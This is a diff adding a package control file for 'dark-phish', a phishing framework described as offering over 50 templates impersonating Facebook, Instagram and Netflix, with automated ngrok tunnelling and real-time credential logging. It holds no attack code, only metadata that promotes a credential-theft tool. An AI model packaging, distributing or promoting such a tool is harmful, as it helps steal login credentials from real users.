@@ -1,0 +1,13 @@
+Package: dark-phish
+Version: 2.3.0
+Architecture: all
+Maintainer: Alienkrishn [Anon4You]
+Depends: git, php, python, python-tkinter, openssh, npm
+Section: web
+Priority: optional
+Homepage: https://github.com/Cyber-Anonymous/Dark-Phish
+Description: Powerful Phishing Tool with 50+ templates
+ Dark-Phish is a comprehensive phishing framework offering over 50
+ ready‑to‑use templates (e.g., Facebook, Instagram, Netflix). It
+ includes an interactive setup menu, automated ngrok tunnel creation,
+ and real‑time credential logging via local web server.
